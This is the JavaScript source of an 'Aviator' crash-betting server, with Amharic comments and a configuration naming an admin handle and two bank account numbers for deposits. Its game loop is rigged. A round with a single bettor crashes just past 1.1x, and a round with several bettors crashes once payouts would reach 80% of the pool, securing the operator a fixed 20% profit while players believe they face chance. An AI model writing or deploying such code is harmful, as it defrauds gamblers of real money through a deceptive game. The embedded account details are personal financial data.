const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const path = require('path');

// --- CONFIGURATION ---
const ADMIN_CONFIG = {
    username: "@Dawit_Fikadu21",
    profitMargin: 0.20, // 20% ትርፍ ሲገኝ ክራሽ ያደርጋል
    referralBonus: 5.0, // ለአንድ ሰው 5 ብር
    cbe: "1000179571815",
    abyssinia: "165097254"
};

// --- GAME STATE ---
let gameState = {
    multiplier: 1.0,
    isCrashed: false,
    activeBets: [], // በአሁኑ ዙር የተወራረዱ ሰዎች
    totalPool: 0,   // በአሁኑ ዙር የተሰበሰበ ጠቅላላ ገንዘብ
    history: []
};

let adminStats = {
    totalDeposits: 0,
    totalProfit: 0,
    pendingWithdrawals: []
};

app.use(express.static(path.join(__dirname, 'public')));

// --- REAL-TIME CONNECTION ---
io.on('connection', (socket) => {
    console.log('አዲስ ተጫዋች ገብቷል: ' + socket.id);

    // ተጫዋቹ ሲገባ የቆዩ መረጃዎችን መላክ
    socket.emit('initGame', {
        gameState,
        config: ADMIN_CONFIG
    });

    // ቤቲንግ ሲያደርጉ (Betting)
    socket.on('placeBet', (data) => {
        // data = { username: "...", amount: 100 }
        gameState.activeBets.push({ id: socket.id, ...data });
        gameState.totalPool += data.amount;
        
        io.emit('updateBets', gameState.activeBets);
    });

    // ዲፖዚት ጥያቄ ለአድሚን ሲላክ
    socket.on('submitDeposit', (data) => {
        // አድሚን ፓኔል ላይ እንዲታይ ይደረጋል
        console.log(`ዲፖዚት ጥያቄ ከ ${data.username}: ${data.amount} ETB (FT: ${data.ftNumber})`);
        adminStats.totalDeposits += parseFloat(data.amount);
        // እዚህ ጋር ዳታቤዝ ውስጥ ማስቀመጥ ይቻላል
    });

    // ዊዝድሮው ጥያቄ ለአድሚን ሲላክ
    socket.on('submitWithdraw', (data) => {
        adminStats.pendingWithdrawals.push(data);
        io.emit('adminUpdate', adminStats);
    });
});

// --- CORE GAME LOGIC (20% PROFIT CALCULATION) ---
function runGameLoop() {
    if (gameState.isCrashed) {
        // አዲስ ዙር ከመጀመሩ በፊት ቆይታ
        setTimeout(() => {
            gameState.multiplier = 1.0;
            gameState.isCrashed = false;
            gameState.totalPool = 0;
            gameState.activeBets = [];
            io.emit('gameReset');
        }, 3000);
        return;
    }

    // አውሮፕላኑን ማብረር
    gameState.multiplier += 0.01;
    io.emit('tick', gameState.multiplier.toFixed(2));

    // CRASH LOGIC: 
    // 1. አንድ ሰው ብቻ ከሆነ ወዲያውኑ ክራሽ ያደርጋል (ኪሳራ ለመከላከል)
    // 2. ብዙ ሰዎች ካሉ፣ አጠቃላይ ከወጣው ገንዘብ 20% ትርፍ ሲቀረው ክራሽ ያደርጋል
    
    let currentPayout = 0;
    gameState.activeBets.forEach(bet => {
        currentPayout += bet.amount * gameState.multiplier;
    });

    // ካዝኖው 20% ትርፍ ማረጋገጥ አለበት (Profit = TotalPool * 0.20)
    // የሚከፈለው ገንዘብ ከ (ጠቅላላ ገቢ - 20% ትርፍ) በላይ ከሆነ ክራሽ!
    const safetyLimit = gameState.totalPool * (1 - ADMIN_CONFIG.profitMargin);

    if (gameState.activeBets.length === 1 && gameState.multiplier > 1.1) {
        crashGame();
    } else if (gameState.activeBets.length > 1 && currentPayout >= safetyLimit) {
        crashGame();
    }
}

function crashGame() {
    gameState.isCrashed = true;
    adminStats.totalProfit += (gameState.totalPool * ADMIN_CONFIG.profitMargin);
    io.emit('crash', gameState.multiplier.toFixed(2));
}

// በየ 100 ሚሊ ሰከንድ ሉፑን ማሰራት
setInterval(runGameLoop, 100);

// --- SERVER START ---
const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`Aviator Server በፖርት ${PORT} ላይ ስራ ጀምሯል።`);
    console.log(`አድሚን ፓኔል: ${ADMIN_CONFIG.username} ስር ነው`);
});
